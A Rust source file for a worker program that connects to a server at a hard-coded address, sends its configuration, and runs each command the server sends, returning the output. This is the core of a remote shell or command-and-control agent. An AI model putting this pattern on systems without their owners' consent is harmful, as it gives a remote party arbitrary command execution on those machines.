use std::io::{self, Write, Read, BufRead, BufReader};
use crate::worker::network::connect_server;
use crate::config::{Config, Command};
use crate::worker::utils::execute_command;

mod config;
mod worker;

fn main() -> io::Result<()> {
    // let ip = String::from("192.168.1.70");
    let ip = String::from("127.0.0.1");
    let port = String::from("7878");
    let mut stream = connect_server(ip.clone(), port.clone())?;
    println!("[I] Connected to server {}:{}.", ip, port);

    // Create Config object and serialize it
    let config = Config::new();
    let config_json = config.to_json().expect("Failed to serialize Config") + "\n";
    stream.write_all(config_json.as_bytes())?;
    stream.flush()?;

    let mut reader = BufReader::new(&stream);
    let mut buffer: Vec<u8> = Vec::new();

    loop {
        buffer.clear();
        let bytes_read = reader.read_until(b'\n', &mut buffer)?;
        if bytes_read == 0 {
            print!("[I] Server closed the connection.");
            break
        }

        match serde_json::from_slice::<Command>(&buffer) {
            Ok(mut command) => {
                println!("[I] Received command: {}", command.name);
                match execute_command(&command.name) {
                    Ok(output) => {
                        command.output = Some(output);
                        println!("[I] Command executed. Sending result back.");
                    },
                    Err(e) => {
                        println!("[E] Command execution failed: {}", e);
                        command.output = Some(format!("Error executing \
                                                      command: {}", e));
                    }
                }
                let reponse_json = command.to_json().expect("Failed to \
                            serialize command response") + "\n";
                stream.write_all(reponse_json.as_bytes())?;
                stream.flush()?;
            },
            Err(e) => {
                println!("[E] Failed to deserialize Client Config from \
                               {}: {}", ip, e);
            }
        }
    }

    Ok(())
}

